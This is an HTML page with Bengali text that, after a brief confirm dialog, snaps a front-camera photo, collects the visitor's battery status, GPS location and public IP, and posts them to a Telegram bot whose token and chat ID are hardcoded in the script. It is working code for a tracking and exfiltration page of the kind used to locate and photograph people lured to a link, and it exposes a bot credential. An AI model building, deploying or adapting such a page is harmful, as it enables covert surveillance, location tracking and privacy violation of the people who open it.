
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📸 একবার ছবি + লোকেশন + IP</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      text-align: center;
      padding: 30px;
    }
    button {
      padding: 15px 25px;
      font-size: 18px;
      background-color: green;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    video {
      display: none;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>📷 ছবি + 📍 লোকেশন + 🌐 IP + 🔋 ব্যাটারি</h2>
  <p>⚠️ সম্মতি দিলে একবার ক্যামেরা ছবি ও তথ্য পাঠানো হবে।</p>

  <video id="video" autoplay playsinline width="300"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <br><br>
  <button onclick="startProcess()">📸 ছবি পাঠাও</button>
  <p id="status">🟡 প্রস্তুত...</p>

  <script>
    const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
    const CHAT_ID = "1054739462";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');

    async function startProcess() {
      const confirmed = confirm("আপনি কি সম্মতি দিচ্ছেন? একবার ছবি ও তথ্য পাঠানো হবে।");
      if (!confirmed) {
        status.innerText = "❌ সম্মতি বাতিল করা হয়েছে।";
        return;
      }

      // Start camera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.style.display = "block";
        status.innerText = "📸 ক্যামেরা চলছে...";

        setTimeout(() => {
          captureAndSend(stream);
        }, 3000);
      } catch (err) {
        status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
      }
    }

    async function captureAndSend(stream) {
      // Draw to canvas
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoBlob = dataURItoBlob(canvas.toDataURL("image/jpeg"));

      // Stop camera
      stream.getTracks().forEach(track => track.stop());
      video.style.display = "none";

      // Get battery info
      let batteryInfo = "🔋 Battery: Unknown";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
      } catch (e) {}

      // Get location
      let locationInfo = "📍 Location: Not Available";
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej);
        });
        const { latitude, longitude } = pos.coords;
        locationInfo = `📍 https://www.google.com/maps?q=${latitude},${longitude}`;
      } catch (e) {}

      // Get IP
      let ipInfo = "🌐 IP: Unknown";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipInfo = `🌐 IP: ${ipData.ip}`;
      } catch (e) {}

      // Prepare message
      const caption = `${batteryInfo}
${locationInfo}
${ipInfo}`;

      // Send to Telegram
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", photoBlob, "photo.jpg");
      formData.append("caption", caption);

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      }).then(response => {
        if (response.ok) {
          status.innerText = "✅ একবার সফলভাবে পাঠানো হয়েছে!";
        } else {
          status.innerText = "⚠️ পাঠাতে সমস্যা হয়েছে!";
        }
      }).catch(error => {
        console.error(error);
        status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
      });
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }
  </script>
</body>
</html>
